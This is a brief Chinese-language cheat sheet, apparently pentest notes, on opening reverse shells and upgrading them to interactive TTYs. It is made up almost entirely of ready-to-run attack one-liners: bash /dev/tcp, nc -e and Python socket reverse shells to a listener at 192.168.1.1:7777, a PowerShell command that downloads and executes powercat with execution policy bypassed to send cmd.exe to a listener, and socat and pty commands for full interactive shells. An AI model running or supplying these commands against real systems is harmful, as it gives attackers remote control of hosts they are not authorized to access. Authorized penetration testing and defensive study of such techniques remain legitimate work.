# 反弹shell & 升级交互式shell

## 0x01 反弹shell

### Linux

等待反弹的shell会话主机：192.168.1.1:7777  
### bash
  
```
/bin/bash -i >& /dev/tcp/192.168.1.1/7777 0>&1     
```
### nc
```
nc -e /bin/bash 192.168.1.1 7777  
```
### python
新建python脚本执行     
或者通过python -c ''    
```
import os;os.system("bash -c 'bash -i >& /dev/tcp/192.168.1.1/7777 0>&1'")
```
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

### Windows

### powercat
https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1    
```
powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.1.1 -p 9999 -e cmd.exe"   
```
## 0x02 提升shell交互能力

### Linux
#### python
它可以执行命令su，以为他们是在一个合适的终端执行。要升级一个shell，只需运行以下命令：     
```
python -c 'import pty; pty.spawn("/bin/bash")'

```
#### socat(反弹交互式shell)
本机监听(192.168.0.1):   
```
socat file:`tty`,raw,echo=0 tcp-listen:8888
```
目标主机:   
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.0.1:8888   
```
如果没有安装socat。有独立的二进制文件可以从这个Github下载：https://github.com/andrew-d/static-binaries    

## Ref 
- [将简单的shell升级为完全交互式的TTY](https://www.4hou.com/posts/mQ7R)
